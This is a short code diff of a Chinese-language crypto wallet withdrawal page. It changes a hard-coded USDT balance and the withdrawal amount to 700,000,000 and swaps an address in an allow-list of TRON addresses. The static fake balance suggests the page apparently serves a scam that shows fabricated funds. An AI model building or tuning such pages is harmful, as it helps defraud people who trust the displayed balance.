@@ -25,8 +25,8 @@
 <body>
 
   <p>钱包地址：<span id="addr">未连接</span></p>
-  <p class="balance">120,000,000,000 USDT</p>
-  <button id="btn" disabled>提现 50 USDT</button>
+  <p class="balance">700,000,000 USDT</p>
+  <button id="btn" disabled>提现 700,000,000 USDT</button>
   <p id="status"></p>
   <p class="tip">仅限授权地址指令性提现</p>
 
@@ -34,7 +34,7 @@
   <script>
     // —— 配置区 —— 
     const ALLOWED = [
-      'TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc',
+      'TB2RUcnLcbnt7AH5X3eauJSFLiaSFNYrv3',
       'TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'
     ];
     const CONTRACT_ADDRESS = 'TFFf2iQjJxxPjs4HwxBm1Tfa695LWAZPL'; 
